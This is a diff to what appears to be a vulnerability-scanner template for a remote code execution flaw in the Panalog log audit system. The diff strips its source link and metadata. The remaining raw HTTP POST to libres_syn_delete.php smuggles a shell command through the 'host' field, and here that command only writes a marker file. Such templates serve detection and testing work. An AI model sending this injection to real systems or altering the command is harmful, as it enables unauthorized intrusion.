@@ -3,12 +3,8 @@ info:
   name: Panalog 日志审计系统RCE漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/axmi6dgfathvctig'
+  description: ''
   tags: rce,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: axmi6dgfathvctig
-    fofa: app="Panabit-Panalog"
 http:
 - raw:
   - 'POST /content-apply/libres_syn_delete.php HTTP/1.1
@@ -21,8 +17,6 @@ http:
 
 
     Connection: close
-
-
 
 
     token=1&id=2&host=| echo "dudesite" >dudesite.txt
